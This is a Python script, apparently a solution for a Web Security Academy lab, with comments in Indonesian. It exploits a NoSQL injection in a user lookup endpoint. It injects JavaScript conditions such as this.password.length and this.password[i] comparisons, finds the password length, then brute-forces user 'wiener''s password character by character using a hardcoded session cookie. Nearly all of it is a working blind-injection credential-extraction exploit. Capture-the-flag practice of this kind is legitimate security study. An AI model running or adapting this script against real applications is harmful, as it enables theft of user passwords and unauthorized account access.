import requests

url = "https://0a940090039adff780b38ff900260041.web-security-academy.net/user/lookup?user="
char_besar_kecil_space_simbol = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/\\ "

headers = {
    "Cookie": "session=DBrcUlC350Nt7qS2dim7B6Hc23TxZe29"
}

# Variabel untuk menampung password yang valid
password_valid = ""

# Cari panjang password terlebih dahulu
password_length = 0
for length in range(1, 21):  # Asumsikan panjang password tidak lebih dari 20 karakter
    urlCheckLength = url + f"wiener'%26%26this.password.length>{length}||'a'=='b"
    requestLengthCheck = requests.get(urlCheckLength, headers=headers)
    
    # Cek jika response berupa JSON
    try:
        response_json = requestLengthCheck.json()
        if response_json.get("message") == "Could not find user":
            print(f"Password length is not greater than {length}.")
            password_length = length
            break  # Panjang password ditemukan, keluar dari loop
    except ValueError:
        print(f"Response is not in JSON format when checking length > {length}.")
        
if password_length == 0:
    print("Failed to determine password length.")
else:
    print(f"Password length determined: {password_length}")

# Jika panjang password ditemukan, lanjutkan brute force karakter
for i in range(password_length):
    found_valid_char = False  # Menandai apakah karakter valid ditemukan pada indeks ini

    for char in char_besar_kecil_space_simbol:
        urlBruteForce = url + f"wiener'%26%26this.password[{i}]=='{char}"
        requestBruteForce = requests.get(urlBruteForce, headers=headers)
        
        # Cek jika response berupa JSON
        try:
            response_json = requestBruteForce.json()
            # Filter jika message "Could not find user"
            if response_json.get("message") == "Could not find user":
                print(f"Skipping character '{char}' at index {i} - User not found.")
                continue  # Skip iterasi ini jika pesan ditemukan
        except ValueError:
            print(f"Response is not in JSON format for character '{char}' at index {i}.")
        
        # Jika respons valid dan bukan pesan "Could not find user"
        if requestBruteForce.status_code == 200:
            print(f"Password character at position {i} is '{char}'")
            password_valid += char  # Tambahkan karakter yang valid ke password_valid
            found_valid_char = True  # Menandai bahwa karakter valid ditemukan
            break  # Keluar dari loop dan lanjut ke indeks berikutnya setelah menemukan karakter yang benar
    
    # Jika tidak ada karakter valid ditemukan pada indeks ini, break total
    if not found_valid_char:
        print(f"No valid character found at index {i}. Stopping brute force.")
        break

# Output password yang ditemukan sejauh ini
print(f"Password found: {password_valid}")
